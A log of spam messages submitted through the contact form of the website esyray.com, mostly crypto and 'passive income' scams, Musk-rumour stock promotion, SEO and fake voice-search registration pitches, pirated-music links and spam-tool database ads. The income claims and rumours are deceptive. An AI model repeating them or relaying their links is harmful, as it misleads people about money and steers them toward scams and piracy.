+++ 2021-06-22 02:59:35 PM -- Email from: Heergo, -- subject: I promised., -- email: 2gb7tx2f@yahoo.com, -- Message is: Cryptocurrency rates are breaking records, which means you have the opportunity to make money on cryptocurrencies. Join our system and start making money with us. Go to system: https://tiodroncountmenom.ga
+++ 2021-06-24 05:52:42 AM -- Email from: Suzanne Quam, -- subject: , -- email: jhlaalshmar@polostar.me, -- Message is: Stop! Don't pay for another ad again until you've read this:  http://bit.ly/5-ways-to-advertise-free
+++ 2021-06-24 07:13:57 AM -- Email from: Philomena Blevins, -- subject: Website Submitter© - New clients, have arrived, -- email: blevins.philomena@gmail.com, -- Message is: Hi
Hope you’re good, and that clients are profitable. Please allow me to introduce to you this service that you may find useful for your business.
You can’t expect to make a website and have visitors come to you - that’s too passive. You’ll need to act.
https://business-it-services.com
Kind regards,
We offer the most effective IT services you may purchase on our website for making big money in a small business, still not considering getting clients? Here is a quick, 1-click unsubscribe link: https://business-it-services.com/?unsubscribe=esyray.com
+++ 2021-06-24 10:50:27 AM -- Email from: Russel Wahl, -- subject: How to Get Everything You Want, In a Way which Helps the Whole World - Geshe Michael Roach, -- email: wahl.russel@yahoo.com, -- Message is: In his TEDx talk, he will share a teaching from the oldest printed book in the world—the Diamond Cutter Sutra—which helps us get everything we want in life, in a way which also helps the entire world. We will be learning an ancient method known as the Four Steps, which can be applied to five different goals: financial independence for the rest of our life; great personal and professional relationships; vibrant health and energy; a clear, happy, and focused mind—and most importantly, how we can use all these to find out why we came into this world, and how we can live a life of great purpose and meaning.

Geshe Michael Roach is a Princeton University graduate who spent 25 years in a Tibetan monastery and is the first American to be awarded the degree of Geshe, or Master of Buddhism. He utilized his monastery training to help build a major New York corporation which reached $250 million in annual sales, and was sold to super-investor Warren Buffett in 2009. Michael used a large portion of his business profits, and support from companies like Hewlett Packard, to found a 25-year effort to train and pay Tibetan refugees to input thousands of their endangered ancient books and make them available online for free.

We are not affiliated to Michael Roach in anyway. We are helping to spread his message to make this world a better place. Please share with your friends if you find this helpful.
Watch Geshe Michael Roach's TED talk here.
https://bit.ly/3znMgFe

Listen to the Diamond Cutter Sutra in English below in youtube:
https://bit.ly/3zpREYz
The Diamond Sutra - 
&quot;The Diamond That Cuts Through Illusion&quot;
A new translation In English by Alex Johnson
Read by Chris Johnys.
+++ 2021-06-25 02:04:18 AM -- Email from: Philipwak, -- subject: Passives Einkommen ab 85000 EUR pro Tag, -- email: max2110@yahoo.fr, -- Message is: Passives Einkommen ab 89000 EUR pro Tag   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc3dCG6&amp;sa=D&amp;Gd=Cw&amp;usg=AFQjCNFLQMCiRQiARVa8QoPKHO3-uxzRyQ   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-06-25 06:04:56 AM -- Email from: Florida McMinn, -- subject: How to Get Everything You Want, In a Way which Helps the Whole World - Geshe Michael Roach, -- email: mcminn.florida@msn.com, -- Message is: In his TEDx talk, he will share a teaching from the oldest printed book in the world—the Diamond Cutter Sutra—which helps us get everything we want in life, in a way which also helps the entire world. We will be learning an ancient method known as the Four Steps, which can be applied to five different goals: financial independence for the rest of our life; great personal and professional relationships; vibrant health and energy; a clear, happy, and focused mind—and most importantly, how we can use all these to find out why we came into this world, and how we can live a life of great purpose and meaning.

Geshe Michael Roach is a Princeton University graduate who spent 25 years in a Tibetan monastery and is the first American to be awarded the degree of Geshe, or Master of Buddhism. He utilized his monastery training to help build a major New York corporation which reached $250 million in annual sales, and was sold to super-investor Warren Buffett in 2009. Michael used a large portion of his business profits, and support from companies like Hewlett Packard, to found a 25-year effort to train and pay Tibetan refugees to input thousands of their endangered ancient books and make them available online for free.

We are not affiliated to Michael Roach in anyway. We are helping to spread his message to make this world a better place. Please share with your friends if you find this helpful.
Watch Geshe Michael Roach's TED talk here.
https://bit.ly/3znMgFe

Listen to the Diamond Cutter Sutra in English below in youtube:
https://bit.ly/3zpREYz
The Diamond Sutra - 
&quot;The Diamond That Cuts Through Illusion&quot;
A new translation In English by Alex Johnson
Read by Chris Johnys.
+++ 2021-06-27 06:19:19 AM -- Email from: Philipwak, -- subject: Passives Online-Einkommen ab 350000 EUR pro Monat, -- email: boulloche25@hotmail.fr, -- Message is: Alle Kredite zuruckzahlen und zu Hause online verdienen ab 13500 EUR pro Tag   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc3dCJG&amp;sa=D&amp;Xp=Ce&amp;usg=AFQjCNGsri5FB8turonndeWUSP449YcSrA   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-06-27 05:04:37 PM -- Email from: Curtis Benari, -- subject: Sebastian Leppla, -- email: FredColina@yahoo.com, -- Message is: Here is a list of 18 free traffic sources that you should be using: http://bit.ly/18freetrafficsources
+++ 2021-06-27 05:29:33 PM -- Email from: Aidan McCarten, -- subject: Cute puppy coin Shiba Inu is on 85% discount, -- email: mccarten.aidan@googlemail.com, -- Message is: The world was focusing on Doge Coin after Elon Musk tweeted that he owns Doge coin.

Do you know there is another cryptocurrency - Shi Inbu Coin is that down 85% from its top earlier?

Crypto currencies are volatile and big fortune (and losses) can be made within weeks or months.

With Shi Inu at such low prices, you can consider buying some at Binance (https://bit.ly/33yXOqz)

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz


If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-06-28 02:50:45 AM -- Email from: hclickscomgepk, -- subject: Visit hClicks to improve esyray.com, -- email: hclicks@rambler.ru, -- Message is: Hello! 
This is Greg an I am owner of https://hClicks.com 
I just noticed that your site esyray.com does not contain push notifications and I would like to offer you the highest rates for this type of ad! 
Only one step and you will start to get profit. 
Do you want to know our advantages? 
-&gt; Anti-AdBlock Domains 
-&gt; Personal approach 
-&gt; Daily payments 
To get the maximum rates, please send your request with a personal code to our support team hClicks-esyray.com-2021. 
We are waiting for you 
https://hClicks.com
+++ 2021-06-28 05:21:22 AM -- Email from: JessieGlack, -- subject: Download Music Private FTP, -- email: lallo19781@alice.it, -- Message is: Hello, 
 
Download Music FLAC Scene Releases: https://0daymusic.org 
Label, LIVESETS, Music Videos. 
Download Dance, Electro, House, Techno, Trance, Pop, Rock, Rap... 
 
Best regards, 
0day MP3s
+++ 2021-06-28 08:36:16 AM -- Email from: Juana Horrocks, -- subject: Cute puppy coin Shiba Inu is on 85% discount, -- email: juana.horrocks@gmail.com, -- Message is: The world was focusing on Doge Coin after Elon Musk tweeted that he owns Doge coin.

Do you know there is another cryptocurrency - Shi Inbu Coin is that down 85% from its top earlier?

Crypto currencies are volatile and big fortune (and losses) can be made within weeks or months.

With Shi Inu at such low prices, you can consider buying some at Binance (https://bit.ly/33yXOqz)

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz


If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-06-28 03:53:10 PM -- Email from: Nicole Rideout, -- subject: Important Reminder, -- email: nicole@alexadirectory.link, -- Message is: Hey! 

Have you remembered to activate voice search for your business?

Activate it here in 30 seconds:

https://voicebizreg.xyz/mroe-cusotmers/?=esyray.com

Without activation, customers may not be able to find esyray.com with voice searches on Google, Amazon Alexa or mobile phones.

Nicole Rideout
Voice Activation Follow-up Specialist














 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voicebizreg.xyz/unsubscribe.php/?site=esyray.com
+++ 2021-06-29 06:05:20 AM -- Email from: RafaelVoite, -- subject: Warez Music Scene Releases, -- email: dbabato@alice.it, -- Message is: Hello, 
 
Download Music Scene Releases: https://0daymusic.org 
Server's capacity 186 TB Music 
Support for FTP, FTPS, SFTP, HTTP, HTTPS. 
 
Best regards, Rafael 
0DAY MP3s
+++ 2021-06-29 07:45:48 AM -- Email from: Ricky Penrod, -- subject: How To Get More Traffic to esyray.com in 2021, -- email: penrod.ricky58@gmail.com, -- Message is: Hi,

We're wondering if you've ever considered taking the content from esyray.com and converting it into videos to promote on social media platforms such as Youtube?

It's another 'rod in the pond' in terms of traffic generation, as so many people use Youtube.

You can read a bit more about the software here: https://www.vidnami.com/c/CLxQQ-vn-freetrial

Kind Regards,
Ricky
+++ 2021-06-29 03:39:05 PM -- Email from: Kennith from GetPeople.io, -- subject: RE : your website, -- email: getpeopleio@gmail.com, -- Message is: Hello  Previous Meetings team,
My name is Kennith I’m working for GetPeople.io, I think that we have the perfect audience for your website esyray.com, we can bring you up to 500 targeted visitors per day that will like your content and buy your product.
You can try our service for free right here :https://cutt.ly/qxFAfz5
Of course, our website traffic is niche and location targeted. :)
If you have any question you can reach out to me at hello@getpeople.io, I look forward working with you !
Best regards,
Kennith from GetPeople.io
+++ 2021-06-29 07:53:17 PM -- Email from: Kurt Coward, -- subject: Do you accept Guest Posts on esyray.com?, -- email: kurt.coward@hotmail.com, -- Message is: Hi,

We’re reaching out to ask if you’d be interested in featuring a guest post on your website. We believe we can add value to your audience on a few related topics that would resonate with your readers. 

If our offer is of interest to you, please complete the form here: https://backlinkpro.club/add-your-site

Kind Regards,
Kurt
+++ 2021-06-30 01:00:25 AM -- Email from: Rozella Shuman, -- subject: Skyrocket - esyray.com, -- email: rozella.shuman@hotmail.com, -- Message is: Greetings
You might need someone to fix errors (if any) on esyray.com, and we will be happy to help you. You can hire us here:
https://it-technicians.com/technicalseo
Have great day!
We offer the very best IT services you can find on our shop for making big money in a small business, still not considering getting new customers? Here is an easy, 1-click unsubscribe link: https://it-technicians.com/unsubscribe=esyray.com
+++ 2021-06-30 01:16:54 PM -- Email from: Ted Trevascus, -- subject: , -- email: 9cdali145k@pokesenak.buzz, -- Message is: Need more buyers for your website? Read this: http://bit.ly/buyers-to-your-site-now
+++ 2021-06-30 05:48:11 PM -- Email from: Nila Grishin, -- subject: 50 facebook shares for esyray.com, inside., -- email: nila.grishin@outlook.com, -- Message is: Hi
Your content is all published, and you've registered all your social accounts. Now what? How do you get the word out about your pages, and where do you focus your time? We know, and we are hungry to grow your social media presence.
See what we do:
https://it-web-marketing.com/socialnetworks
Kind regards,
We offer the most effective IT services you may find on our online shop for making big money in a small business, still not enthusiastic about getting new clients? Here is a quick, 1-click unsubscribe link: https://it-web-marketing.com/?unsubscribe=esyray.com
+++ 2021-07-02 02:06:17 AM -- Email from: Marshall Reardon, -- subject: Cute puppy coin Shiba Inu is on 85% discount, -- email: marshall.reardon@gmail.com, -- Message is: The world was focusing on Doge Coin after Elon Musk tweeted that he owns Doge coin.

Do you know there is another cryptocurrency - Shi Inbu Coin is that down 85% from its top earlier?

Crypto currencies are volatile and big fortune (and losses) can be made within weeks or months.

With Shi Inu at such low prices, you can consider buying some at Binance (https://bit.ly/33yXOqz)

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz


If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-07-02 03:03:15 AM -- Email from: Mike Saunder, -- subject: Get DA50+ for esyray.com, -- email: vigliotticatherine32@gmail.com, -- Message is: Hi there 
 
Increase your esyray.com Moz DA Score with us and get more visibility and exposure for your website. 
We have tons of client`s feedbacks that this simple boost doubled their sales in a matter of weeks. 
 
More info: 
https://www.monkeydigital.org/product/moz-da50-seo-plan/ 
 
NEW: 
https://www.monkeydigital.org/product/ahrefs-dr50-ur70-seo-plan/ 
https://www.monkeydigital.org/product/trust-flow-seo-package/ 
 
 
thank you 
Mike Saunder
+++ 2021-07-02 06:26:34 PM -- Email from: Kristie Moore, -- subject: Voice Search, -- email: kristie@business-directory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz.xyz/mroe-cusotmers/?=esyray.com


Kristie
Voice Activation Follow-up Specialist
Business Directory Link



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz.xyz/unsubscribe.php/?site=esyray.com
+++ 2021-07-03 06:52:03 AM -- Email from: kruhass, -- subject: договор раскрутка сайта продвижение, -- email: glukhina05@mail.ru, -- Message is: Заказать seo поисковую оптимизацию сайта, Заказать услуги по продвижению сайта По всем возникшим вопросам Вы можете обратиться в скайп логин &lt;b&gt;pokras7777&lt;/b&gt;Раскрутка сайта под ключ 
.Так же собираем базы  Обратесь всегда будем рабы вам помочь https://seoprofisional.ru/bazy  наша группа в телеграме &lt;a href=https://seoprofisional.ru&gt;бесплатные базы для хрумера&lt;/a&gt; 
 
http://bazexrumer.ru/category/bazy-dlya-khrumera-2017/page/157/
http://bazexrumer.ru/tag/gsa-search-engine-ranker/page/71/
http://bazexrumer.ru/category/wordpress-besplatnyy/page/45/
http://bazexrumer.ru/tag/cms-wordpress/page/43/
http://bazexrumer.ru/skachat-bazu-yuridicheskikh-lic-besplatno/
http://bazexrumer.ru/tag/baza-dlya-khrumera-kupit/page/14/
http://bazexrumer.ru/perspektiva-optovaya-baza-voronezh-katalog-tovarov-ceny/
http://bazexrumer.ru/pravovaya-baza-skachat/
http://bazexrumer.ru/lodka-boatmaster/
http://bazexrumer.ru/category/bazy-saytov-dlya-khrumera/page/113/
http://bazexrumer.ru/category/kupit-bazy-dlya-khrumera/page/203/
http://bazexrumer.ru/cms-wordpress-referat/
http://bazexrumer.ru/magazin-forum-murmansk-katalog-tovarov/
http://bazexrumer.ru/category/baza-dlya-khrumera/page/33/
http://bazexrumer.ru/damy-bez-kompleksov-v-socsetyakh/
+++ 2021-07-03 01:57:48 PM -- Email from: Lance Slover, -- subject: Elon Musk and this newly listed NASDAQ company in the crypto industry, -- email: lance.slover@yahoo.com, -- Message is: Elon Musk is a visionary and he is well knowned to have the midas touch. Anything he tweets or gets involved in, goes up in prices.

Elon Musk caused Bitcoin's price to soar when he tweeted about it.

Proof: https://www.forbes.com/sites/jonathanponciano/2021/06/13/musk-denies-bitcoin-pump-and-dump-and-says-tesla-will-resume-transactions-once-this-mining-goal-is-reached/?sh=17fdcafeaa2a

Elon Musk caused Doge Coin to soar when he tweeted about it.
https://www.news.com.au/finance/money/investing/dogecoin-price-elon-musk-pumps-crypto-with-ceo-tweet/news-story/adb38ab506f84b632992bd8314068003

The most important question everyone has is: &quot;what is next?&quot;

The short answer is a newly listed NASDAQ crypto mining company from Canada.

Rumours have it that Elon Musk or Tesla might have or is going to acquire a stake in this newly listed NASDAQ.

Many are waiting for his &quot;infamous&quot; tweets to send stock price soaring.

With all the talk about going green, this newly listed Bitcoin and Ethereum mining company is a green company that mines bitcoin and ethereum using green energy.

It is currently trading at less than USD$3.50 in NASDAQ, way lower than it's all time high in 2018. And Bitcoin and Ethereum have broken their all time high, making this stock highly undervalued.

This company is Canadian company Hive Blockchain. You can check out their stock here:
https://www.nasdaq.com/market-activity/stocks/hvbtf

Rumours have it that Elon Musk or Tesla has taken a stake in this company which just listed on NASDAQ on 1st July 2021.

https://www.foxbusiness.com/markets/bitcoin-miners-form-council-meeting-elon-musk
https://ca.finance.yahoo.com/news/3-reasons-hive-blockchain-technologies-230044627.html

If you are a long term investor, you can consider buying this stock for the long term.

If you are a short term speculator, you can consider the strategy of buy the rumour and sell the news on HIVE Blockchain stock.

For more on this stock, you can visit the official website here: https://www.hiveblockchain.com/

And do check out what the investor community is saying about HIVE BLOCKCHAIN here in Yahoo: https://finance.yahoo.com/quote/HIVE.V/community?p=HIVE.V

Don't miss out on this golden opporunity!
+++ 2021-07-03 04:04:58 PM -- Email from: Sam McNicoll, -- subject: Elon Musk and this newly listed NASDAQ company in the crypto industry, -- email: sam.mcnicoll@gmail.com, -- Message is: Elon Musk is a visionary and he is well knowned to have the midas touch. Anything he tweets or gets involved in, goes up in prices.

Elon Musk caused Bitcoin's price to soar when he tweeted about it.

Proof: https://www.forbes.com/sites/jonathanponciano/2021/06/13/musk-denies-bitcoin-pump-and-dump-and-says-tesla-will-resume-transactions-once-this-mining-goal-is-reached/?sh=17fdcafeaa2a

Elon Musk caused Doge Coin to soar when he tweeted about it.
https://www.news.com.au/finance/money/investing/dogecoin-price-elon-musk-pumps-crypto-with-ceo-tweet/news-story/adb38ab506f84b632992bd8314068003

The most important question everyone has is: &quot;what is next?&quot;

The short answer is a newly listed NASDAQ crypto mining company from Canada.

Rumours have it that Elon Musk or Tesla might have or is going to acquire a stake in this newly listed NASDAQ.

Many are waiting for his &quot;infamous&quot; tweets to send stock price soaring.

With all the talk about going green, this newly listed Bitcoin and Ethereum mining company is a green company that mines bitcoin and ethereum using green energy.

It is currently trading at less than USD$3.50 in NASDAQ, way lower than it's all time high in 2018. And Bitcoin and Ethereum have broken their all time high, making this stock highly undervalued.

This company is Canadian company Hive Blockchain. You can check out their stock here:
https://www.nasdaq.com/market-activity/stocks/hvbtf

Rumours have it that Elon Musk or Tesla has taken a stake in this company which just listed on NASDAQ on 1st July 2021.

https://www.foxbusiness.com/markets/bitcoin-miners-form-council-meeting-elon-musk
https://ca.finance.yahoo.com/news/3-reasons-hive-blockchain-technologies-230044627.html

If you are a long term investor, you can consider buying this stock for the long term.

If you are a short term speculator, you can consider the strategy of buy the rumour and sell the news on HIVE Blockchain stock.

For more on this stock, you can visit the official website here: https://www.hiveblockchain.com/

And do check out what the investor community is saying about HIVE BLOCKCHAIN here in Yahoo: https://finance.yahoo.com/quote/HIVE.V/community?p=HIVE.V

Don't miss out on this golden opporunity!
+++ 2021-07-03 06:20:01 PM -- Email from: Ferdinand Cunningham, -- subject: , -- email: ehelala_boyzu@typery.com, -- Message is: You still paying for clicks? Why? Check this out:   https://bit.ly/results-without-paying-for-clicks
+++ 2021-07-03 11:57:50 PM -- Email from: Belen Dorman, -- subject: esyray.com - optimized, -- email: belen.dorman@gmail.com, -- Message is: Greetings
Do you want to optimize your website? Finally, a comprehensive service where you can sit back and let us do everything for you. Let us help you:
https://business-it-services.com/technicalseo
Have great day!
We offer the very best IT services you can find on our website for making big money in a small business, still not enthusiastic about getting new business? Here is a quick, 1-click unsubscribe link: https://business-it-services.com/unsubscribe=esyray.com
+++ 2021-07-04 10:32:09 PM -- Email from: kruhass, -- subject: раскрутка сайта продвижение, -- email: glukhina05@mail.ru, -- Message is: Заказать seo поисковую оптимизацию сайта, Заказать услуги по продвижению сайта По всем возникшим вопросам Вы можете обратиться в скайп логин &lt;b&gt;pokras7777&lt;/b&gt;Раскрутка сайта под ключ 
.Так же собираем базы  Обратесь всегда будем рабы вам помочь https://seoprofisional.ru/bazy  наша группа в телеграме &lt;a href=https://seoprofisional.ru&gt;бесплатные базы для хрумера&lt;/a&gt; 
 
http://bazexrumer.ru/category/bazy-dlya-khrumera-2017/page/184/
http://bazexrumer.ru/baza-pesen-karaoke-skachat/
http://bazexrumer.ru/category/kupit-bazy-dlya-khrumera/page/27/
http://bazexrumer.ru/category/wordpress-besplatnyy/page/226/
http://bazexrumer.ru/skachat-bazu-superjob/
http://bazexrumer.ru/tag/bazy-saytov-dlya-khrumera/page/17/
http://bazexrumer.ru/cms-wordpress-cena/
http://bazexrumer.ru/category/skachat-bazu-dlya-khrumera/page/244/
http://bazexrumer.ru/tag/baza-dlya-khrumera-kupit/page/70/
http://bazexrumer.ru/category/skachat-bazy-dlya-khrumera-2019/page/8/
http://bazexrumer.ru/tag/bazy-pod-khrumer-kupit-bazy-dlya-khrumera/page/36/
http://bazexrumer.ru/category/wordpress-baza-dlya-khrumera/page/230/
http://bazexrumer.ru/category/wordpress-izmenit-adres-sayta-v-baze-dannykh/page/207/
http://bazexrumer.ru/xevil-skachat-besplatno/
http://bazexrumer.ru/category/baza-ssylok-dlya-khrumera/page/39/
+++ 2021-07-05 12:41:25 AM -- Email from: Saar, -- subject: Please Help Anne To Repair Her Home After Storm Damage, -- email: saar.jbakker@gmail.com, -- Message is: Hi, my name is Saar and I am fundraising for Anne, please help to save the old aunt Anne's house! You too can help us to save the old house together.
Anna is an old lady who is very warm with everyone, lives alone, has no family.
Please show that you are an understanding, helping person and you know that a similar disaster can happen to anyone.
Click here for details: https://bit.ly/2V89bVq

I’m so sorry if you take my message as harassment, I don’t intend to harass you, but unfortunately there is no other way to help Anna.

Thank you for your understanding, have a nice day,
Saar
+++ 2021-07-05 11:15:07 AM -- Email from: Francis Jamieson, -- subject: Voice search, -- email: francis.jamieson@alexabusinessdirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voicesetupbiz1.xyz/mroe-cusotmers/?=esyray.com


 

 
Francis















 
2764 Pleasant Road Suite        Suite A PMB 708        Fort Mill        SC        29708

You can skip future marketing messages here:
https://voicesetupbiz1.xyz/unsubscribe.php/?site=esyray.com
+++ 2021-07-05 04:56:59 PM -- Email from: Lara Dupree, -- subject: Let us write your content, -- email: info@getarticlesdone.net, -- Message is: Hello

Need more content?

We write the content for your website or blog. 

We can also syndicate your content for better reach.

Check us out at https://GetArticlesDone.net

Take a look and bookmark us now.

Get your content marketing going.


Best Regards!

Your GAD Support Team

PS: Why? More content means more visitors and authority. We have highly rated US/UK Writers. Original Content. Fast Turnaround. Lowest Pricing. 








If you do not wish further communication you can unsubscribe your site at https://unsubscribe.getarticlesdone.net
+++ 2021-07-06 03:32:57 PM -- Email from: Eric Jones, -- subject: Your site – more leads?, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hey, this is Eric and I ran across esyray.com a few minutes ago.

Looks great… but now what?

By that I mean, when someone like me finds your website – either through Search or just bouncing around – what happens next?  Do you get a lot of leads from your site, or at least enough to make you happy?

Honestly, most business websites fall a bit short when it comes to generating paying customers. Studies show that 70% of a site’s visitors disappear and are gone forever after just a moment.

Here’s an idea…
 
How about making it really EASY for every visitor who shows up to get a personal phone call you as soon as they hit your site…
 
You can –
  
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It signals you the moment they let you know they’re interested – so that you can talk to that lead while they’re literally looking over your site.

CLICK HERE https://talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

You’ll be amazed - the difference between contacting someone within 5 minutes versus a half-hour or more later could increase your results 100-fold.

It gets even better… once you’ve captured their phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation.
  
That way, even if you don’t close a deal right away, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Pretty sweet – AND effective.

CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-07-07 03:55:26 AM -- Email from: Daniela Ortu, -- subject: Can you enhance your pages with videos?, -- email: daniela.ortu@cropvid.com, -- Message is: Hello there,

I discovered about your brand and website in Google and I did not find any video about your brand in your website, vimeo or youtube.

Do you know that videos are important to attract your audience to your brand?

I am Daniela, founder of CropVid, together with my team, we just launched a set of great tools for video creators.

Many of the features we are offering are free of charge. If you ever needed to resize your videos or add captions or subtitles to them to engage your audience, make sure to reach out to us or subscribe to our tool at this link. https://cropvid.com

PS: To get a first free month on paid subscriptions, please add CROPVID2021 in the coupon field.

Daniela Ortu
Founder of CropVid
daniela.ortu@cropvid.com
https://cropvid.com
+++ 2021-07-07 04:31:58 AM -- Email from: Angelo Platzer, -- subject: Bethann Bertholf, -- email: WillieMcghinnis@hotmail.com, -- Message is: Here is a list of 18 free traffic sources that you should be using: http://bit.ly/18freetrafficsources
+++ 2021-07-08 03:57:56 AM -- Email from: Mike Reynolds, -- subject: Local SEO for more business, -- email: lovingmeaghan32@gmail.com, -- Message is: Hi there 
 
We will improve your Local Ranks organically and safely, using only whitehat methods, while providing Google maps and website offsite work at the same time. 
 
Please check our pricelist here, we offer Local SEO at cheap rates. 
https://speed-seo.net/product/local-seo-package/ 
 
NEW: 
https://www.speed-seo.net/product/zip-codes-gmaps-citations/ 
 
regards 
Mike Reynolds
 
Speed SEO Digital Agency
+++ 2021-07-08 07:23:55 PM -- Email from: Ashley McNeel, -- subject: Important Reminder, -- email: ashely@thevoicedirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
http://voicesetupbiz.xyz/mroe-cusotmers/?=esyray.com


Ashley
Voice Activation Follow-up Specialist
The Voice Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
http://voicesetupbiz.xyz/unsubscribe.php/?site=esyray.com
+++ 2021-07-09 03:33:46 AM -- Email from: Flossie Bohm, -- subject: Elon Musk and this newly listed NASDAQ company in the crypto industry, -- email: flossie.bohm@msn.com, -- Message is: Elon Musk is a visionary and he is well knowned to have the midas touch. Anything he tweets or gets involved in, goes up in prices.

Elon Musk caused Bitcoin's price to soar when he tweeted about it.

Proof: https://www.forbes.com/sites/jonathanponciano/2021/06/13/musk-denies-bitcoin-pump-and-dump-and-says-tesla-will-resume-transactions-once-this-mining-goal-is-reached/?sh=17fdcafeaa2a

Elon Musk caused Doge Coin to soar when he tweeted about it.
https://www.news.com.au/finance/money/investing/dogecoin-price-elon-musk-pumps-crypto-with-ceo-tweet/news-story/adb38ab506f84b632992bd8314068003

The most important question everyone has is: &quot;what is next?&quot;

The short answer is a newly listed NASDAQ crypto mining company from Canada.

Rumours have it that Elon Musk or Tesla might have or is going to acquire a stake in this newly listed NASDAQ.

Many are waiting for his &quot;infamous&quot; tweets to send stock price soaring.

With all the talk about going green, this newly listed Bitcoin and Ethereum mining company is a green company that mines bitcoin and ethereum using green energy.

It is currently trading at less than USD$3.50 in NASDAQ, way lower than it's all time high in 2018. And Bitcoin and Ethereum have broken their all time high, making this stock highly undervalued.

This company is Canadian company Hive Blockchain. You can check out their stock here:
https://www.nasdaq.com/market-activity/stocks/hvbtf

Rumours have it that Elon Musk or Tesla has taken a stake in this company which just listed on NASDAQ on 1st July 2021.

https://www.foxbusiness.com/markets/bitcoin-miners-form-council-meeting-elon-musk
https://ca.finance.yahoo.com/news/3-reasons-hive-blockchain-technologies-230044627.html

If you are a long term investor, you can consider buying this stock for the long term.

If you are a short term speculator, you can consider the strategy of buy the rumour and sell the news on HIVE Blockchain stock.

For more on this stock, you can visit the official website here: https://www.hiveblockchain.com/

And do check out what the investor community is saying about HIVE BLOCKCHAIN here in Yahoo: https://finance.yahoo.com/quote/HIVE.V/community?p=HIVE.V

Don't miss out on this golden opporunity!
+++ 2021-07-09 03:47:43 PM -- Email from: , -- subject: , -- email: team@bark.com, -- Message is: Hi,

Ziianna has just asked us to help them find a quality Electrician in Sachse, TX, 75048.

We’re now contacting local professionals on their behalf, and if you respond quickly there’s a strong chance you’ll secure the business. It’s free to do so, and there’s no obligation to continue using our service in future.

A maximum of 5 professionals can contact Ziianna, so be quick!

Take a look at Ziianna’s request below and, if you can help, click the following link to contact them directly.

Contact Ziianna now: https://www.bark.com/find-work/united-states/sachse-tx-75048/electricians/f3771e2d/p38704998/
                   
Client details:

Ziianna
Electricians - Sachse, TX, 75048
Ziianna has made their phone number available. We will make it available to you when you send your first message.

Project details:

What kind of work do you need doing?: Fan install 

What type of property is this for?: House

When do you want the work done?: Within the next week

Additional Details: N/A



Reply now: https://www.bark.com/find-work/united-states/sachse-tx-75048/electricians/f3771e2d/p38704998/

What is Bark?
Bark is a lead generation service. Customers tell us what they’re looking for and we put them in touch with great companies like yours to help get the job done.

Join today and you’ll be able to contact your first customer on us. After that, there’s no commission, no monthly fee – and everything you make with us is yours to keep.

We’ll send you information about new customers for free, and you can simply pick and choose the ones that work best for you.

Why have we contacted you?
We believe your company can help Ziianna with their project, and we’d like to put you two in touch.

They’ve asked us to find a great local Electrician, and if you respond right away there’s a strong chance you’ll secure the business.

Contact Ziianna now: https://www.bark.com/find-work/united-states/sachse-tx-75048/electricians/f3771e2d/p38704998/

If you’d like any help with this, please call (424) 227-5323 (open 24 hours a day, 7 days a week) or email team@bark.com and we'll be happy to assist.

Many thanks, 
Andrew Good

If you don't want to hear from us again when new customers are looking for services in your area click here: https://www.bark.com/en/us/p-unsubscribe/LDnp29/ENeEmG/?x=1
